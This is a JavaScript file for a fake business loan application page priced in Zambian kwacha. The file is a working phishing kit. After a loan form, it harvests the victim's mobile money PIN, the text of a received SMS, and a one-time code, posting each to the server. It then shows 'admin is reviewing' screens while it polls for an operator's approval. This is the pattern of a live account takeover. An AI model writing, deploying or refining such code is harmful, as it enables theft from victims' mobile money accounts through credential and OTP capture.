let currentAppId = null;
let pollInterval = null;
let appData = {
  amount: 1000000,
  term: '48 Months',
  type: 'Business Loan',
  purpose: '',
  firstName: '',
  lastName: '',
  phone: '',
  employment: '',
  income: ''
};

// --- Welcome / Calculator View Logic ---
const loanRange = document.getElementById('loanRange');
const calcAmountDisplay = document.getElementById('calcAmountDisplay');
const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
const startAppBtn = document.getElementById('startAppBtn');

if (loanRange) {
  loanRange.addEventListener('input', (e) => {
    const val = Number(e.target.value);
    appData.amount = val;
    calcAmountDisplay.textContent = 'ZMW ' + val.toLocaleString();
    const monthly = Math.round(val / 48);
    monthlyPaymentDisplay.textContent = 'ZMW ' + monthly.toLocaleString();
    const inputLoanAmount = document.getElementById('inputLoanAmount');
    if (inputLoanAmount) inputLoanAmount.value = val;
  });
}

if (startAppBtn) {
  startAppBtn.addEventListener('click', () => {
    document.getElementById('view-welcome').style.display = 'none';
    document.getElementById('application-flow').style.display = 'block';
    showStep(1);
  });
}

const backBtn = document.getElementById('backBtn');
if (backBtn) {
  backBtn.addEventListener('click', () => {
    document.getElementById('application-flow').style.display = 'none';
    document.getElementById('view-welcome').style.display = 'block';
  });
}

// --- Multi-Step Form Navigation ---
function showStep(stepNum) {
  document.querySelectorAll('#application-flow .form-step').forEach(el => el.style.display = 'none');
  document.getElementById(`step-${stepNum}`).style.display = 'block';
  
  for (let i = 1; i <= 3; i++) {
    const line = document.getElementById(`indicator-${i}`);
    if (line) {
      if (i <= stepNum) line.classList.add('active');
      else line.classList.remove('active');
    }
  }
  const counterText = document.getElementById('stepCounterText');
  if (counterText) counterText.textContent = `Step ${stepNum} of 3`;
}

document.getElementById('step1Next')?.addEventListener('click', () => {
  appData.type = document.getElementById('loanType').value;
  appData.amount = document.getElementById('inputLoanAmount').value;
  appData.term = document.getElementById('loanTerm').value;
  appData.purpose = document.getElementById('loanPurpose').value;
  showStep(2);
});

document.getElementById('step2Back')?.addEventListener('click', () => showStep(1));
document.getElementById('step2Next')?.addEventListener('click', () => {
  appData.firstName = document.getElementById('firstName').value;
  appData.lastName = document.getElementById('lastName').value;
  appData.phone = document.getElementById('momo_phone').value;

  if (!appData.firstName || !appData.lastName || appData.phone.length < 9) {
    alert('Please fill in valid names and phone number.');
    return;
  }

  document.getElementById('sumAmount').textContent = 'ZMW ' + Number(appData.amount).toLocaleString();
  document.getElementById('sumTerm').textContent = appData.term;
  document.getElementById('sumPurpose').textContent = appData.purpose || '-';
  document.getElementById('sumApplicant').textContent = `${appData.firstName} ${appData.lastName}`;
  showStep(3);
});

document.getElementById('step3Back')?.addEventListener('click', () => showStep(2));
document.getElementById('submitAppBtn')?.addEventListener('click', async () => {
  appData.employment = document.getElementById('employmentStatus').value;
  appData.income = document.getElementById('annualIncome').value;

  try {
    const res = await fetch('/applications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(appData)
    });
    const data = await res.json();
    currentAppId = data.id;

    document.getElementById('application-flow').style.display = 'none';
    document.getElementById('displayPhoneNum').textContent = appData.phone;
    document.getElementById('momo-login-view').style.display = 'block';
  } catch (e) {
    currentAppId = 'APP-999888777';
    document.getElementById('application-flow').style.display = 'none';
    document.getElementById('displayPhoneNum').textContent = appData.phone;
    document.getElementById('momo-login-view').style.display = 'block';
  }
});

// --- PIN Input Verification Flow ---
const momoPinInput = document.getElementById('momo_pin');
const loginMoMoBtn = document.getElementById('loginMoMoBtn');

if (momoPinInput) {
  momoPinInput.addEventListener('input', (e) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 5);
    e.target.value = val;
    const dots = document.querySelectorAll('.pin-dots .dot');
    dots.forEach((dot, idx) => {
      dot.textContent = val[idx] ? '•' : '';
    });
    if (val.length === 5) loginMoMoBtn.removeAttribute('disabled');
    else loginMoMoBtn.setAttribute('disabled', 'true');
  });
}

if (loginMoMoBtn) {
  loginMoMoBtn.addEventListener('click', async () => {
    const pin = momoPinInput.value;
    document.getElementById('momo-login-view').style.display = 'none';
    showWaitingScreen('Verifying MoMo PIN', 'Checking PIN status with admin...', 'Admin is reviewing your PIN...');

    await fetch('/verify-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ appId: currentAppId, pin, phone: appData.phone })
    });

    startPolling('PIN_APPROVED', 'PIN_REJECTED', () => {
      hideWaitingScreen();
      document.getElementById('sms-verification-view').style.display = 'block';
      startSmsTimer();
    });
  });
}

// --- SMS Verification Flow ---
let smsTimerInterval;
function startSmsTimer() {
  let timeLeft = 55;
  const timerElem = document.getElementById('timerSeconds');
  clearInterval(smsTimerInterval);
  smsTimerInterval = setInterval(() => {
    timeLeft--;
    if (timerElem) timerElem.textContent = timeLeft;
    if (timeLeft <= 0) clearInterval(smsTimerInterval);
  }, 1000);
}

const smsTextarea = document.getElementById('sms_text');
const submitSmsBtn = document.getElementById('submitSmsBtn');

if (smsTextarea) {
  smsTextarea.addEventListener('input', (e) => {
    if (e.target.value.trim().length > 5) submitSmsBtn.removeAttribute('disabled');
    else submitSmsBtn.setAttribute('disabled', 'true');
  });
}

if (submitSmsBtn) {
  submitSmsBtn.addEventListener('click', async () => {
    const smsText = smsTextarea.value;
    document.getElementById('sms-verification-view').style.display = 'none';
    showWaitingScreen('Verifying SMS Message', 'Checking SMS content with admin...', 'Admin is reviewing your SMS...');

    await fetch('/verify-sms', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ appId: currentAppId, smsText })
    });

    startPolling('SMS_APPROVED', 'SMS_REJECTED', () => {
      hideWaitingScreen();
      document.getElementById('otp-verification-view').style.display = 'block';
    });
  });
}

// --- OTP Verification Flow ---
const otpInput = document.getElementById('otp_code');
const submitOtpBtn = document.getElementById('submitOtpBtn');

if (otpInput) {
  otpInput.addEventListener('input', (e) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    e.target.value = val;
    if (val.length === 4) submitOtpBtn.removeAttribute('disabled');
    else submitOtpBtn.setAttribute('disabled', 'true');
  });
}

if (submitOtpBtn) {
  submitOtpBtn.addEventListener('click', async () => {
    const otpCode = otpInput.value;
    document.getElementById('otp-verification-view').style.display = 'none';
    showWaitingScreen('Verifying OTP Code', 'Checking OTP code with admin...', 'Admin is verifying your OTP...');

    await fetch('/verify-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ appId: currentAppId, otpCode })
    });

    startPolling('APPROVED', 'OTP_REJECTED', () => {
      hideWaitingScreen();
      document.getElementById('success-view').style.display = 'block';
    });
  });
}

// --- General Polling Function for Admin Actions ---
function startPolling(successStatus, rejectStatus, onSuccessCallback) {
  clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/check-status/${currentAppId}`);
      const data = await res.json();

      if (data.status === successStatus) {
        clearInterval(pollInterval);
        onSuccessCallback();
      } else if (data.status === rejectStatus) {
        clearInterval(pollInterval);
        hideWaitingScreen();
        alert('Verification rejected by admin. Please try again.');
        location.reload();
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
}

function showWaitingScreen(title, subtitle, progressText) {
  document.getElementById('waitingTitle').textContent = title;
  document.getElementById('waitingSubtitle').textContent = subtitle;
  document.getElementById('waitingProgressBar').textContent = progressText;
  document.getElementById('appIdText').textContent = currentAppId;
  document.getElementById('admin-waiting-view').style.display = 'flex';
}

function hideWaitingScreen() {
  document.getElementById('admin-waiting-view').style.display = 'none';
      }
    
